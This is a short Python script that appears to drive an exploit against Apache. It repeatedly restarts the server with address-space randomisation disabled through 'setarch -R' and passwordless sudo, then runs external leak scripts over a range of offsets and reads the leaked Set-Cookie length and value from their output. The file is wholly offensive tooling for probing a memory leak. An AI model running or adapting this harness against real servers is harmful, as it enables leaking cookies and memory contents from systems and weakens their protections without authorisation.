#!/usr/bin/env python3
import subprocess,time,re
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.12)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.18)
for k in range(70,83):
    stopstart()
    sh("python3 send_a_leak3.py 1001 2 1 12 17 >/dev/null 2>&1"); time.sleep(0.08)
    r=sh(f"python3 b_numleak2.py {k} 1 0x1000 2>&1")
    m=re.search(r'SETCOOKIE_LEN (\d+)',r.stdout)
    v=re.search(r'VALUE (.*)',r.stdout)
    print(f"K={k} len={m.group(1) if m else -1} {(v.group(1)[:40] if v else '')}",flush=True)
